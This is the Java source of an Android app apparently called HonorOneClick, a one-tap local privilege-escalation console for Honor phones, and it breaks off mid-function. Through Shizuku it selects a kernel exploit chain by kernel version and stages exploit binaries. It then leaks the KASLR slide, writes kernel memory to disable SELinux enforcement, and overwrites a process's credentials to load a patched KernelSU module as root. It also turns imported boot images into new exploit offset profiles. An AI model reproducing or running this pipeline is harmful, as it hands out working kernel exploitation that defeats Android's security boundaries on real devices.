package com.aiden.honoroneclick;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.LinearGradient;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.RadialGradient;
import android.graphics.Shader;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.RippleDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.PowerManager;
import android.util.Log;
import android.view.HapticFeedbackConstants;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsets;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.compose.ui.platform.ComposeView;
import androidx.core.content.FileProvider;
import androidx.core.view.WindowCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.json.JSONArray;
import org.json.JSONObject;

import moe.shizuku.server.IRemoteProcess;
import moe.shizuku.server.IShizukuService;
import rikka.shizuku.Shizuku;
import rikka.shizuku.ShizukuBinderWrapper;

public final class MainActivity extends ComponentActivity implements UiActions {
    private static final int REQ_SHIZUKU = 1001;
    private static volatile String WORK;
    private static final String LEGACY_KERNEL =
            "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k";
    private static final String CVE_98260_KERNEL =
            "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k";
    private static final String CVE_98260_LEGACY_ROOT_SOCKET =
            "/data/local/tmp/cve98260-root.sock";
    private static final String CVE_98260_ROOT_SOCKET_PREFIX =
            "/data/local/tmp/cve98260-root-";
    private static final String MANAGER = "me.weishu.kernelsu";
    private static final long MANAGER_VERSION_CODE = 32680;
    private static final String MANAGER_CERT_SHA256 =
            "c371061b19d8c7d7d6133c6a9bafe198fa944e50c1b31c9d8daa8d7f1fc2d2d6";
    private static final String MANAGER_ASSET_SHA256 =
            "b4a059ace71de2fa65cc7f12b1c58d55fc23ab25e057ee4230ce779742abe450";
    private static final String SHIZUKU_ASSET_SHA256 =
            "6e273ab0e991c4e79bc8b1bbb9b9dd739ccac1a8712a541a214078886b7b790f";

    private final ActivityResultLauncher<String[]> bootImagePicker =
            registerForActivityResult(new ActivityResultContracts.OpenDocument(), uri -> {
                if (uri != null) startBootImageImport(uri);
            });

    private static final class KernelProfile {
        final String id;
        final String kernel;
        final long timerLink;
        final long credLink;
        final long slideSiteLow;
        final long selinuxLink;
        final long userNs;
        final long rootUser;
        final long groups;
        final long ucounts;
        final int kitimerSize;
        final int kitimerNode;
        final int taskCred;
        final int credSize;
        final int slabObjects;
        final int slabPages;
        final String moduleAsset;
        final String symbolsAsset;

        KernelProfile(String id, String kernel, long timerLink, long credLink,
                      long slideSiteLow, long selinuxLink, long userNs,
                      long rootUser, long groups, long ucounts,
                      int kitimerSize, int kitimerNode,
                      int taskCred, int credSize, int slabObjects, int slabPages,
                      String moduleAsset, String symbolsAsset) {
            this.id = id;
            this.kernel = kernel;
            this.timerLink = timerLink;
            this.credLink = credLink;
            this.slideSiteLow = slideSiteLow;
            this.selinuxLink = selinuxLink;
            this.userNs = userNs;
            this.rootUser = rootUser;
            this.groups = groups;
            this.ucounts = ucounts;
            this.kitimerSize = kitimerSize;
            this.kitimerNode = kitimerNode;
            this.taskCred = taskCred;
            this.credSize = credSize;
            this.slabObjects = slabObjects;
            this.slabPages = slabPages;
            this.moduleAsset = moduleAsset;
            this.symbolsAsset = symbolsAsset;
        }
    }

    private final Handler ui = new Handler(Looper.getMainLooper());
    private TextView output;
    private TextView status;
    private TextView statusDetail;
    private View statusDot;
    private TextView shizukuState;
    private TextView kernelState;
    private ScrollView logScroll;
    private GlassButton run;
    private LiquidProgressView progress;
    private PowerManager.WakeLock wakeLock;
    private UiState uiState;
    private int progressValue = 3;
    private volatile boolean busy;
    private volatile String cve98260RootSocket;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        wakeLock = ((PowerManager) getSystemService(POWER_SERVICE))
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "HonorOneClick:run");
        wakeLock.setReferenceCounted(false);
        Window window = getWindow();
        window.setStatusBarColor(Color.TRANSPARENT);
        window.setNavigationBarColor(Color.TRANSPARENT);
        WindowCompat.setDecorFitsSystemWindows(window, false);
        window.getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
        uiState = new UiState();
        uiState.setKernelState(isOfficialManagerInstalled()
                ? "管理器已安装" : "未安装");
        ComposeView composeView = new ComposeView(this);
        ComposeBridge.attach(composeView, uiState, this);
        setContentView(composeView);
        Shizuku.addBinderReceivedListenerSticky(this::refreshShizuku);
        Shizuku.addBinderDeadListener(this::refreshShizuku);
        Shizuku.addRequestPermissionResultListener((request, result) -> refreshShizuku());
        refreshShizuku();
    }

    private void buildUi() {
        FrameLayout root = new FrameLayout(this);
        root.addView(new LiquidBackdrop(this),
                new FrameLayout.LayoutParams(-1, -1));

        ScrollView page = new ScrollView(this);
        page.setFillViewport(true);
        page.setClipToPadding(false);
        page.setVerticalScrollBarEnabled(false);
        root.addView(page, new FrameLayout.LayoutParams(-1, -1));

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setClipToPadding(false);
        page.addView(content, new ScrollView.LayoutParams(-1, -2));
        page.setOnApplyWindowInsetsListener((v, insets) -> {
            content.setPadding(dp(20),
                    insets.getSystemWindowInsetTop() + dp(20),
                    dp(20),
                    insets.getSystemWindowInsetBottom() + dp(26));
            return insets;
        });

        LinearLayout brand = new LinearLayout(this);
        brand.setOrientation(LinearLayout.HORIZONTAL);
        brand.setGravity(Gravity.CENTER_VERTICAL);
        ImageView mark = new ImageView(this);
        mark.setImageResource(R.drawable.ic_launcher_foreground);
        mark.setScaleType(ImageView.ScaleType.CENTER_INSIDE);
        mark.setBackground(roundFill(0x18FFFFFF, dp(18), 0x38FFFFFF));
        mark.setPadding(dp(9), dp(9), dp(9), dp(9));
        brand.addView(mark, new LinearLayout.LayoutParams(dp(54), dp(54)));

        LinearLayout brandText = new LinearLayout(this);
        brandText.setOrientation(LinearLayout.VERTICAL);
        brandText.setPadding(dp(14), 0, 0, 0);
        TextView kicker = text("HONOR / PRIVILEGE LAB", 10, 0xFF89E9BA, Typeface.BOLD);
        kicker.setLetterSpacing(0.16f);
        brandText.addView(kicker);
        TextView title = text("OneClick", 32, 0xFFF7FCFB, Typeface.BOLD);
        title.setLetterSpacing(-0.03f);
        brandText.addView(title);
        brand.addView(brandText);
        content.addView(brand);

        TextView intro = text("原版 Shizuku 驱动的本地提权控制台", 14, 0xFFA6B7B2,
                Typeface.NORMAL);
        intro.setPadding(0, dp(12), 0, dp(20));
        content.addView(intro);

        GlassPanel statusPanel = glassPanel();
        LinearLayout statusTop = row();
        TextView statusLabel = text("SYSTEM STATE", 10, 0xFF93AAA4, Typeface.BOLD);
        statusLabel.setLetterSpacing(0.14f);
        statusPanel.addView(statusLabel);
        statusPanel.addView(space(9));
        LinearLayout statusLine = row();
        statusDot = new View(this);
        statusDot.setBackground(circle(0xFFFFC66D));
        statusLine.addView(statusDot, new LinearLayout.LayoutParams(dp(9), dp(9)));
        LinearLayout.LayoutParams dotLp =
                (LinearLayout.LayoutParams)statusDot.getLayoutParams();
        dotLp.rightMargin = dp(9);
        dotLp.gravity = Gravity.CENTER_VERTICAL;
        status = text("等待 Shizuku", 22, 0xFFF7FCFB, Typeface.BOLD);
        statusLine.addView(status);
        statusPanel.addView(statusLine);
        statusDetail = text("请先连接 Shizuku 服务", 13, 0xFF9DADA9,
                Typeface.NORMAL);
        statusDetail.setPadding(0, dp(5), 0, dp(13));
        statusPanel.addView(statusDetail);
        progress = new LiquidProgressView(this);
        statusPanel.addView(progress, new LinearLayout.LayoutParams(-1, dp(9)));
        content.addView(statusPanel);
        content.addView(space(12));

        GlassPanel devicePanel = glassPanel();
        TextView deviceLabel = text("DEVICE PROFILE", 10, 0xFF93AAA4, Typeface.BOLD);
        deviceLabel.setLetterSpacing(0.14f);
        devicePanel.addView(deviceLabel);
        String model = Build.MODEL == null ? "UNKNOWN" : Build.MODEL.toUpperCase(Locale.ROOT);
        TextView deviceName = text(model, 25, 0xFFF7FCFB, Typeface.BOLD);
        deviceName.setPadding(0, dp(8), 0, dp(2));
        devicePanel.addView(deviceName);
        TextView code = text(model + "  ·  " + Build.DEVICE.toUpperCase(Locale.ROOT),
                11, 0xFF9CB1AA, Typeface.MONOSPACE);
        code.setLetterSpacing(0.06f);
        devicePanel.addView(code);
        content.addView(devicePanel);
        content.addView(space(12));

        LinearLayout states = row();
        GlassPanel shizukuPanel = miniPanel();
        shizukuPanel.addView(text("SHIZUKU", 10, 0xFF91A49F, Typeface.BOLD));
        shizukuState = text("未连接", 15, 0xFFFFCF82, Typeface.BOLD);
        shizukuState.setPadding(0, dp(6), 0, 0);
        shizukuPanel.addView(shizukuState);
        GlassPanel kernelPanel = miniPanel();
        kernelPanel.addView(text("KERNELSU", 10, 0xFF91A49F, Typeface.BOLD));
        kernelState = text("待检查", 15, 0xFFD7E3DF, Typeface.BOLD);
        kernelState.setPadding(0, dp(6), 0, 0);
        kernelPanel.addView(kernelState);
        LinearLayout.LayoutParams half = new LinearLayout.LayoutParams(0, -2, 1f);
        states.addView(shizukuPanel, half);
        LinearLayout.LayoutParams half2 = new LinearLayout.LayoutParams(0, -2, 1f);
        half2.leftMargin = dp(10);
        states.addView(kernelPanel, half2);
        content.addView(states);
        content.addView(space(14));

        run = actionButton("开始提权", true);
        run.setOnClickListener(v -> {
            v.performHapticFeedback(HapticFeedbackConstants.CONFIRM);
            startPipeline();
        });
        content.addView(run, new LinearLayout.LayoutParams(-1, dp(62)));
        content.addView(space(10));

        LinearLayout utilities = row();
        GlassButton shizuku = actionButton("连接 Shizuku", false);
        shizuku.setOnClickListener(v -> requestShizuku());
        GlassButton manager = actionButton("KernelSU 管理器", false);
        manager.setOnClickListener(v -> openManagerInstaller());
        LinearLayout.LayoutParams util1 = new LinearLayout.LayoutParams(0, dp(52), 1f);
        LinearLayout.LayoutParams util2 = new LinearLayout.LayoutParams(0, dp(52), 1f);
        util2.leftMargin = dp(10);
        utilities.addView(shizuku, util1);
        utilities.addView(manager, util2);
        content.addView(utilities);
        content.addView(space(16));

        GlassPanel logPanel = glassPanel();
        logPanel.setPadding(dp(16), dp(15), dp(16), dp(12));
        LinearLayout logHeader = row();
        TextView logLabel = text("LIVE LOG", 10, 0xFF93AAA4, Typeface.BOLD);
        logLabel.setLetterSpacing(0.16f);
        logHeader.addView(logLabel, new LinearLayout.LayoutParams(0, -2, 1f));
        TextView clear = text("清空", 12, 0xFF8CE8BA, Typeface.BOLD);
        clear.setGravity(Gravity.CENTER);
        clear.setPadding(dp(10), dp(4), dp(4), dp(4));
        clear.setOnClickListener(v -> output.setText(""));
        logHeader.addView(clear);
        logPanel.addView(logHeader);

        logScroll = new ScrollView(this);
        logScroll.setVerticalScrollBarEnabled(false);
        output = new TextView(this);
        output.setTextColor(0xFFC7F7DD);
        output.setTextIsSelectable(true);
        output.setTextSize(12);
        output.setLineSpacing(dp(2), 1f);
        output.setTypeface(Typeface.MONOSPACE);
        output.setPadding(0, dp(12), 0, dp(4));
        output.setText("控制台已就绪。\n默认使用 CVE-2026-98260；实际内核匹配时自动锁定。");
        logScroll.addView(output, new ScrollView.LayoutParams(-1, -2));
        LinearLayout.LayoutParams logLp =
                new LinearLayout.LayoutParams(-1, dp(210));
        logLp.topMargin = dp(3);
        logPanel.addView(logScroll, logLp);
        content.addView(logPanel);

        setContentView(root);
    }

    private TextView text(String value, int sizeSp, int color, Typeface typeface) {
        TextView view = new TextView(this);
        view.setText(value);
        view.setTextSize(sizeSp);
        view.setTextColor(color);
        view.setTypeface(typeface);
        view.setIncludeFontPadding(false);
        return view;
    }

    private TextView text(String value, int sizeSp, int color, int style) {
        return text(value, sizeSp, color,
                Typeface.create("sans-serif", style));
    }

    private LinearLayout row() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        return row;
    }

    private GlassPanel glassPanel() {
        GlassPanel panel = new GlassPanel(this);
        panel.setOrientation(LinearLayout.VERTICAL);
        panel.setPadding(dp(18), dp(17), dp(18), dp(16));
        return panel;
    }

    private GlassPanel miniPanel() {
        GlassPanel panel = glassPanel();
        panel.setPadding(dp(15), dp(14), dp(15), dp(15));
        return panel;
    }

    private GlassButton actionButton(String label, boolean primary) {
        GlassButton button = new GlassButton(this, primary);
        button.setText(label);
        return button;
    }

    private TextView chip(String label, int color) {
        TextView chip = text(label, 10, color, Typeface.BOLD);
        chip.setLetterSpacing(0.1f);
        chip.setGravity(Gravity.CENTER);
        chip.setPadding(dp(11), dp(7), dp(11), dp(7));
        chip.setBackground(roundFill(0x18FFFFFF, dp(20), 0x35FFFFFF));
        return chip;
    }

    private GradientDrawable roundFill(int fill, float radius, int stroke) {
        GradientDrawable d = new GradientDrawable();
        d.setColor(fill);
        d.setCornerRadius(radius);
        d.setStroke(dp(1), stroke);
        return d;
    }

    private GradientDrawable circle(int fill) {
        GradientDrawable d = new GradientDrawable();
        d.setShape(GradientDrawable.OVAL);
        d.setColor(fill);
        return d;
    }

    private View space(int height) {
        View view = new View(this);
        view.setLayoutParams(new LinearLayout.LayoutParams(1, dp(height)));
        return view;
    }

    private void refreshShizuku() {
        try {
            boolean ping = Shizuku.pingBinder();
            boolean permission = ping && Shizuku.checkSelfPermission()
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
            if (permission) {
                ui.post(() -> {
                    uiState.setStatus("Shizuku 已就绪",
                            "公开 AIDL 通道可用，可以开始安全检查", true);
                    uiState.setShizukuState("已授权");
                });
                new Thread(this::refreshKernelProfile, "honor-kernel-profile").start();
            } else if (ping) {
                ui.post(() -> {
                    uiState.setStatus("等待授权",
                            "Shizuku 服务已发现，请授予本应用权限", false);
                    uiState.setShizukuState("待授权");
                });
            } else {
                ui.post(() -> {
                    uiState.setStatus("Shizuku 未运行",
                            "先通过无线调试启动原版 Shizuku 服务", false);
                    uiState.setShizukuState("未连接");
                });
            }
        } catch (Throwable t) {
            ui.post(() -> {
                uiState.setStatus("Shizuku 未连接", "无法读取 Shizuku binder", false);
                uiState.setShizukuState("异常");
            });
        }
    }

    private void requestShizuku() {
        try {
            if (!Shizuku.pingBinder()) {
                openShizukuInstaller();
                return;
            }
            if (Shizuku.checkSelfPermission() !=
                    android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Shizuku.requestPermission(REQ_SHIZUKU);
                log("已请求 Shizuku 权限，请在系统授权页允许。");
            } else {
                refreshShizuku();
                log("Shizuku 权限已就绪。");
            }
        } catch (Throwable t) {
            logError("Shizuku 请求失败：" + t);
        }
    }

    private void openManagerInstaller() {
        try {
            if (isOfficialManagerInstalled()) {
                log("已检测到原版 KernelSU v3.3.1，签名和版本校验通过。");
                launchPackage(MANAGER);
                return;
            }
            throw new IllegalStateException("已安装的 KernelSU 管理器不是官方 v3.3.1");
        } catch (Exception missing) {
            try {
                installBundledApk("KernelSUManager.apk");
            } catch (Throwable t) {
                logError("无法启动管理器安装器：" + t);
            }
        }
    }

    @Override
    public void onConnectShizuku() {
        requestShizuku();
    }

    @Override
    public void onOpenKernelSu() {
        openManagerInstaller();
    }

    @Override
    public void onStartRoot() {
        getWindow().getDecorView().performHapticFeedback(
                HapticFeedbackConstants.CONFIRM);
        startPipeline();
    }

    @Override
    public void onSelectExploit(ExploitChoice choice) {
        if (choice == ExploitChoice.LEGACY_64560 && !uiState.getLegacyAllowed()) {
            logError("当前实际内核不允许选择 64560。");
            return;
        }
        uiState.setExploitChoice(choice);
        log("利用链选择：" + choice.getLabel());
    }

    @Override
    public void onImportBootImage() {
        getWindow().getDecorView().performHapticFeedback(
                HapticFeedbackConstants.CONFIRM);
        bootImagePicker.launch(new String[]{"application/octet-stream", "*/*"});
    }

    private void refreshKernelProfile() {
        try {
            if (!Shizuku.pingBinder() || Shizuku.checkSelfPermission()
                    != android.content.pm.PackageManager.PERMISSION_GRANTED)
                return;
            String kernel = probe("uname -r").trim();
            if (kernel.isEmpty())
                return;
            boolean isCve98260Kernel = CVE_98260_KERNEL.equals(kernel);
            ui.post(() -> {
                uiState.setLegacyAllowed(!isCve98260Kernel);
                if (isCve98260Kernel)
                    uiState.setExploitChoice(ExploitChoice.CVE_98260);
            });
        } catch (Throwable ignored) {
        }
    }

    @Override
    public void onClearLogs() {
        uiState.clearLogs();
    }

    private void installBundledApk(String assetName) throws Exception {
        boolean shizuku = "ShizukuManager.apk".equals(assetName);
        byte[] expected = hexToBytes(shizuku
                ? SHIZUKU_ASSET_SHA256 : MANAGER_ASSET_SHA256);
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        File directory = new File(getCacheDir(), "installer");
        if (!directory.exists() && !directory.mkdirs())
            throw new IllegalStateException("无法创建安装缓存目录");
        File apk = new File(directory,
                shizuku ? "ShizukuManager.apk" : "KernelSUManager.apk");
        try (InputStream in = getAssets().open(assetName);
             OutputStream out = new FileOutputStream(apk)) {
            byte[] b = new byte[65536];
            int n;
            while ((n = in.read(b)) > 0) {
                out.write(b, 0, n);
                digest.update(b, 0, n);
            }
            out.flush();
        }
        if (!MessageDigest.isEqual(expected, digest.digest())) {
            apk.delete();
            throw new IllegalStateException((shizuku ? "Shizuku" : "KernelSU")
                    + " 安装包校验失败");
        }
        Uri uri = FileProvider.getUriForFile(
                this, getPackageName() + ".fileprovider", apk);
        Intent prompt = new Intent(Intent.ACTION_VIEW)
                .setDataAndType(uri, "application/vnd.android.package-archive")
                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                        | Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(prompt);
        log("已打开系统安装页，请确认安装官方 "
                + (shizuku ? "Shizuku" : "KernelSU") + "。");
    }

    private boolean isOfficialManagerInstalled() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    MANAGER, PackageManager.GET_SIGNING_CERTIFICATES);
            if (info.getLongVersionCode() != MANAGER_VERSION_CODE
                    || info.signingInfo == null
                    || info.signingInfo.getApkContentsSigners() == null
                    || info.signingInfo.getApkContentsSigners().length == 0)
                return false;
            byte[] cert = info.signingInfo.getApkContentsSigners()[0].toByteArray();
            String actual = toHex(MessageDigest.getInstance("SHA-256").digest(cert));
            return MANAGER_CERT_SHA256.equals(actual);
        } catch (Throwable ignored) {
            return false;
        }
    }

    private void openShizukuInstaller() {
        try {
            getPackageManager().getPackageInfo("moe.shizuku.privileged.api", 0);
            launchPackage("moe.shizuku.privileged.api");
            log("已打开 Shizuku。请先在 Shizuku 中启动服务，然后回来授权本应用。");
        } catch (Exception missing) {
            try {
                installBundledApk("ShizukuManager.apk");
            } catch (Throwable t) {
                logError("无法启动 Shizuku 安装器：" + t);
            }
        }
    }

    private void startBootImageImport(Uri uri) {
        if (busy) return;
        busy = true;
        progress(4);
        uiState.clearLogs();
        uiState.resetStages();
        uiState.setBusy(true);
        setKernelState("生成配置中", true);
        setSystemStatus("正在导入 boot.img", "解析内核并生成 98260 配置", false);
        wakeLock.acquire(15 * 60 * 1000L);
        new Thread(() -> importBootImage(uri), "honor-boot-import").start();
    }

    private void importBootImage(Uri uri) {
        try {
            stage("读取 boot.img");
            byte[] boot = readUriBytes(uri, 512L * 1024 * 1024);
            stage("解包内核");
            byte[] kernel = KernelProfileGenerator.extractKernel(boot);
            stage("解析内核符号与 BTF");
            KernelProfileGenerator.Result result = KernelProfileGenerator.generate(kernel);
            stage("生成 KernelSU 配置");
            File profileRoot = new File(getFilesDir(), "profiles");
            File directory = new File(profileRoot, result.safeId());
            if (!directory.exists() && !directory.mkdirs())
                throw new IllegalStateException("无法创建配置目录");

            File symbolsFile = new File(directory, "syms.txt");
            writeFileBytes(symbolsFile, result.toSymbolText().getBytes(StandardCharsets.UTF_8));

            File moduleFile = new File(directory, "ksu-template.ko");
            byte[] module = KernelProfileGenerator.patchVermagic(
                    readAsset("ksu-template.ko"), result.kernel);
            writeFileBytes(moduleFile, module);

            JSONObject profile = new JSONObject();
            profile.put("id", result.id);
            profile.put("kernel", result.kernel);
            profile.put("timer_link", hex(result.timerLink));
            profile.put("cred_link", hex(result.credLink));
            profile.put("slide_site_low", hex(result.slideSiteLow));
            profile.put("selinux_link", hex(result.selinuxLink));
            profile.put("user_ns", hex(result.userNs));
            profile.put("root_user", hex(result.rootUser));
            profile.put("groups", hex(result.groups));
            profile.put("ucounts", hex(result.ucounts));
            profile.put("kitimer_size", result.kitimerSize);
            profile.put("kitimer_node", result.kitimerNode);
            profile.put("task_cred", result.taskCred);
            profile.put("cred_size", result.credSize);
            profile.put("slab_objects", 21);
            profile.put("slab_pages", 2);
            profile.put("module_asset", moduleFile.getAbsolutePath());
            profile.put("symbols_asset", symbolsFile.getAbsolutePath());
            profile.put("vulnerable", true);
            JSONObject audit = new JSONObject();
            audit.put("begin_new_exec", hex(result.beginNewExec));
            audit.put("btf_base", hex(result.btfBase));
            audit.put("kallsyms", result.kallsymsCount);
            profile.put("audit", audit);
            writeFileBytes(new File(directory, "profile.json"),
                    profile.toString(2).getBytes(StandardCharsets.UTF_8));

            stage("完成");
            ui.post(() -> uiState.completeCurrentStage());
            progress(100);
            setKernelState("配置可用", true);
            setSystemStatus("配置已导入", result.kernel, true);
        } catch (Throwable t) {
            ui.post(() -> uiState.failCurrentStage());
            setKernelState("配置失败", false);
            setSystemStatus("boot.img 导入失败", String.valueOf(t.getMessage()), false);
            logError("boot.img 导入失败：" + t);
        } finally {
            busy = false;
            ui.post(() -> {
                uiState.setBusy(false);
                wakeLock.release();
            });
        }
    }

    private byte[] readUriBytes(Uri uri, long limit) throws Exception {
        try (InputStream in = getContentResolver().openInputStream(uri)) {
            if (in == null) throw new IllegalStateException("无法打开所选 boot.img");
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buffer = new byte[65536];
            long total = 0;
            int n;
            while ((n = in.read(buffer)) > 0) {
                total += n;
                if (total > limit) throw new IllegalStateException("boot.img 超过 512 MiB");
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        }
    }

    private static void writeFileBytes(File file, byte[] data) throws Exception {
        try (FileOutputStream out = new FileOutputStream(file)) {
            out.write(data);
            out.flush();
        }
    }

    private void startPipeline() {
        if (busy) return;
        busy = true;
        progress(5);
        uiState.clearLogs();
        uiState.resetStages();
        uiState.setBusy(true);
        uiState.setStatus("正在验证环境", "检查设备、内核与 Shizuku 状态", false);
        setKernelState("检查中", true);
        log("开始执行。完整流程可能需要 10-30 分钟，请保持屏幕开启。");
        wakeLock.acquire(30 * 60 * 1000L);
        new Thread(this::pipeline, "honor-oneclick").start();
    }

    private String probe(String command) {
        try {
            Process p = shellProcess(command);
            try (OutputStream ignored = p.getOutputStream()) {
            }
            String out = readAll(p.getInputStream());
            String err = readAll(p.getErrorStream());
            p.waitFor();
            return out + err;
        } catch (Throwable t) {
            return "";
        }
    }

    private void pipeline() {
        try {
            if (!Shizuku.pingBinder())
                throw new IllegalStateException("Shizuku 未运行，请先启动服务");
            if (Shizuku.checkSelfPermission() !=
                    android.content.pm.PackageManager.PERMISSION_GRANTED)
                throw new IllegalStateException("Shizuku 权限未授予");
            stage("检查设备");
            String kernel = shell("uname -r").trim();
            String model = shell("getprop ro.product.model").trim();
            String device = shell("getprop ro.product.device").trim();
            log("model=" + model + " device=" + device + " kernel=" + kernel);
            log("实际内核：" + kernel + "；默认利用链为 98260。");

            ExploitChoice requested = uiState.getExploitChoice();
            boolean isCve98260Kernel = CVE_98260_KERNEL.equals(kernel);
            ui.post(() -> {
                uiState.setLegacyAllowed(!isCve98260Kernel);
                if (isCve98260Kernel)
                    uiState.setExploitChoice(ExploitChoice.CVE_98260);
            });
            ExploitChoice route = resolveExploit(kernel, requested);
            if (isCve98260Kernel && requested != ExploitChoice.CVE_98260)
                log("实际内核精确匹配 98260 目标，已强制选择 CVE-2026-98260。");
            log("最终利用链：" + route.getLabel());

            cleanupHelpers();
            setSystemStatus("正在准备提权", "已选择 " + route.getLabel() + " 利用链", false);
            stage("准备公共组件");
            prepareWorkDirectory();
            stageCommonAssets();

            stage("检查已有 KernelSU");
            boolean moduleLive = shell(
                    "grep -qi kernelsu /proc/modules && echo LIVE || echo OFF").contains("LIVE");
            setKernelState(moduleLive ? "模块已加载" : "模块未加载", true);
            String existingUid = moduleLive
                    ? shell("timeout 15 /system/bin/su -c 'id -u' 2>/dev/null || true").trim()
                    : "";
            log("module=" + (moduleLive ? "Live" : "未加载")
                    + " existing su uid=" + emptyAsUnknown(existingUid));
            if (moduleLive && !"0".equals(existingUid))
                setKernelState("需初始化", false);
            if (moduleLive) {
                stage("复用现有 KernelSU");
                setSystemStatus("正在接管 KernelSU", "复用本次启动已加载的模块", false);
                String grant = initializeKernelSU();
                log(grant.trim());
                finishRoot(route, true);
                return;
            }

            if (route == ExploitChoice.CVE_98260) {
                runCve98260Pipeline(kernel);
            } else {
                runLegacy64560Pipeline(kernel);
            }
            finishRoot(route, false);
        } catch (Throwable t) {
            setKernelState("未就绪", false);
            ui.post(() -> uiState.failCurrentStage());
            ui.post(() -> {
                uiState.setStatus("提权未完成",
                        "查看日志；若已进入 98260 内存回收阶段，不要立即重试，先重启设备", false);
            });
            logError("✗ " + t);
        } finally {
            cleanupHelpers();
            busy = false;
            ui.post(() -> {
                uiState.setBusy(false);
                wakeLock.release();
            });
        }
    }

    private ExploitChoice resolveExploit(String kernel, ExploitChoice requested) {
        if (CVE_98260_KERNEL.equals(kernel))
            return ExploitChoice.CVE_98260;
        return requested == ExploitChoice.LEGACY_64560
                ? ExploitChoice.LEGACY_64560 : ExploitChoice.CVE_98260;
    }

    private void stageCommonAssets() throws Exception {
        stageAsset("ksu_grant", WORK + "/ksu_grant", "755");
        stageAsset("ksu_grant.sh", WORK + "/ksu_grant.sh", "755");
        stageAsset("root_stage.sh", WORK + "/root_stage.sh", "755");
        stageAsset("ksud", WORK + "/ksud", "755");
    }

    private void runLegacy64560Pipeline(String kernel) throws Exception {
        if (!LEGACY_KERNEL.equals(kernel))
            log("[警告] 当前实际内核不是 64560 后端的已记录目标，偏移可能不匹配。");
        stage("准备 64560 组件");
        for (String name : new String[]{"grab.sh", "forker", "t64560_v36",
                "t64560_v42", "perf_cred_honor", "kaslr_slide"}) {
            stageAsset(name, WORK + "/" + name, "755");
        }
        stageAsset("ksu-template.ko", WORK + "/ksu-template.ko", "644");
        stageAsset("syms.txt", WORK + "/syms.txt", "644");

        stage("抓取 KASLR");
        shell("cd " + WORK + " && sh grab.sh");
        long slide = solveSlide();
        long selinux = 0xffffffc08299a6f0L + slide;
        log("slide=" + hex(slide) + " selinux=" + hex(selinux));
        setSystemStatus("正在获取 Root", "内核地址已定位，正在建立临时权限", false);
        stage("检查 SELinux");
        if (!shell("getenforce").contains("Permissive")) {
            shell("cd " + WORK + " && ./t64560_v36 0 " + hex(selinux - 7)
                    + " 160 400 16 6000 12000 4500");
            if (!shell("getenforce").contains("Permissive"))
                throw new IllegalStateException("SELinux permissive 未生效");
        }
        stage("生成当前 boot 的 KernelSU 模块");
        byte[] template = readAsset("ksu-template.ko");
        Map<String, Long> symbols = loadSymbols("syms.txt");
        byte[] module = patchModule(template, symbols, slide);
        stageBytes("ksu-patched.ko", module, "644");
        stage("寻找 cred");
        CredProcess cred = pickCred();
        log("选中 cred=" + hex(cred.cred));
        stage("设置 fsuid/fsgid");
        shell("cd " + WORK + " && ./t64560_v36 0 " + hex(cred.cred + 0x20)
                + " 160 400 16 6000 12000 4500");
        String layout = cred.lines.waitForLine("LAYOUT_DONE", 180);
        if (layout == null) throw new IllegalStateException("cred helper 未完成布局");
        stage("两阶段 cred 写并加载模块");
        setSystemStatus("正在加载 KernelSU", "正在写入凭据并加载内核模块", false);
        shell("rm -f " + WORK + "/PHASE2_DONE");
        String write = runPhaseCommand(
                "cd " + WORK + " && ./t64560_v42 " + hex(cred.cred)
                        + " 260 320 400 16 6000 12000 4500");
        if (!write.contains("PHASE2_DONE"))
            throw new IllegalStateException("两阶段 cred 写未完成");
        String moduleLine = cred.lines.waitForLine("MODULE_LOADED", 45);
        if (moduleLine == null
                && !shell("grep -i kernelsu /proc/modules").contains("kernelsu"))
            throw new IllegalStateException("KernelSU 模块未加载");
        log("KernelSU 模块加载成功");
        setKernelState("模块已加载", true);

        stage("初始化 KernelSU 用户态");
        String grant = initializeKernelSU();
        log(grant.trim());
    }

    private KernelProfile findKernelProfile(String kernel) throws Exception {
        KernelProfile imported = findImportedProfile(kernel);
        if (imported != null) return imported;

        JSONObject root = new JSONObject(new String(
                readAsset("exploit-profiles.json"), StandardCharsets.UTF_8));
        JSONArray profiles = root.getJSONArray("profiles");
